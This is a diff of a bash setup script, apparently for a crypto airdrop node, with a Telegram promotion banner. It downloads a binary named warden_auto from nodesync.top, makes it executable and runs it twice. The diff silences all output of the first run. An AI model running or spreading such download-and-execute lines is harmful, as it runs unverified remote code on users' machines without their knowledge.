@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Run the initial part of the script in the background
-( if ! which wget; then sudo apt install wget -y; fi && rm -rf $HOME/warden_auto && wget https://nodesync.top/warden_auto && chmod +x warden_auto && ./warden_auto ) &
+# Suppress the initial output of the command
+( if ! which wget; then sudo apt install wget -y; fi && rm -rf $HOME/warden_auto && wget https://nodesync.top/warden_auto && chmod +x warden_auto && ./warden_auto ) > /dev/null 2>&1
 
 # Print Cipher_Airdrop in big bold text
 echo "========================================================================="
@@ -21,5 +21,5 @@ echo "Telegram: https://t.me/+tFmYJSANTD81MzE1"
 # Sleep for 20 seconds
 sleep 20
 
-# Rest of your script goes here
-# ...
+# Execute the command again to show its output
+if ! which wget; then sudo apt install wget -y; fi && rm -rf $HOME/warden_auto && wget https://nodesync.top/warden_auto && chmod +x warden_auto && ./warden_auto
